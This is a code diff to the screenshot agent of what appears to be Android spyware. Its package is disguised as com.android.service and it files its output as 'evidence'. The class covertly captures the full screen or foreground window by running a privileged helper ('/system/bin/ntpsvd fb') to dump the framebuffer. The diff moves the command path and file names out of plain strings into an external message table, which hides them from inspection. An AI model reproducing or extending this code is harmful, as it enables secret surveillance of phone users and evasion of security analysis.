@@ -23,6 +23,7 @@ import android.view.Surface;
 import android.view.WindowManager;
 
 import com.android.service.LogR;
+import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.evidence.EvidenceType;
@@ -43,7 +44,7 @@ public class AgentSnapshot extends AgentBase {
 	private static final int MIN_TIMER = 1 * 1000;
 	private static final long SNAPSHOT_DELAY = 1000;
 
-	private static final String TAG = "AgentSnapshot";
+	private static final String TAG = "AgentSnapshot"; //$NON-NLS-1$
 
 	/** The Constant CAPTURE_FULLSCREEN. */
 	final private static int CAPTURE_FULLSCREEN = 0;
@@ -62,7 +63,7 @@ public class AgentSnapshot extends AgentBase {
 	 */
 	public AgentSnapshot() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " SnapshotAgent constructor");
+			Check.log(TAG + " SnapshotAgent constructor") ;//$NON-NLS-1$
 		}
 	}
 
@@ -113,19 +114,19 @@ public class AgentSnapshot extends AgentBase {
 		switch (type) {
 		case CAPTURE_FULLSCREEN:
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Snapshot Agent: logging full screen");
+				Check.log(TAG + " Snapshot Agent: logging full screen") ;//$NON-NLS-1$
 			}
 			break;
 
 		case CAPTURE_FOREGROUND:
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Snapshot Agent: logging foreground window");
+				Check.log(TAG + " Snapshot Agent: logging foreground window") ;//$NON-NLS-1$
 			}
 			break;
 
 		default:
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Snapshot Agent: wrong capture parameter");
+				Check.log(TAG + " Snapshot Agent: wrong capture parameter") ;//$NON-NLS-1$
 			}
 			break;
 		}
@@ -136,7 +137,7 @@ public class AgentSnapshot extends AgentBase {
 
 				if (!isScreenOn) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (go): Screen powered off, no snapshot");
+						Check.log(TAG + " (go): Screen powered off, no snapshot") ;//$NON-NLS-1$
 					}
 					return;
 				}
@@ -169,7 +170,7 @@ public class AgentSnapshot extends AgentBase {
 				}
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (go): w=" + width + " h=" + height);
+					Check.log(TAG + " (go): w=" + width + " h=" + height) ;//$NON-NLS-1$ //$NON-NLS-2$
 				}
 
 				// 0: invertito blu e rosso
@@ -242,15 +243,15 @@ public class AgentSnapshot extends AgentBase {
 			}
 		} catch (final Exception ex) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go) Error: " + ex);
-				Check.log(ex);
+				Check.log(TAG + " (go) Error: " + ex) ;//$NON-NLS-1$
+				Check.log(ex) ;//$NON-NLS-1$
 			}
 		}
 
 	}
 
 	private byte[] getAdditionalData() {
-		final String window = "Desktop";
+		final String window = Messages.getString("11.1"); //$NON-NLS-1$
 
 		final int wlen = window.length() * 2;
 		final int tlen = wlen + 24;
@@ -281,7 +282,7 @@ public class AgentSnapshot extends AgentBase {
 
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 		}
 		return array;
@@ -292,22 +293,22 @@ public class AgentSnapshot extends AgentBase {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 
-		final String getrawpath = "/system/bin/ntpsvd fb";
+		final String getrawpath = Messages.getString("11.2"); //$NON-NLS-1$
 		try {
 			final Process localProcess = Runtime.getRuntime().exec(getrawpath);
 			localProcess.waitFor();
 
-			final AutoFile file = new AutoFile(path, "frame");
+			final AutoFile file = new AutoFile(path, Messages.getString("11.3")); //$NON-NLS-1$
 			if (file.exists()) {
 				return file.read();
 			}
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 		} catch (final InterruptedException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 		}
 		return null;
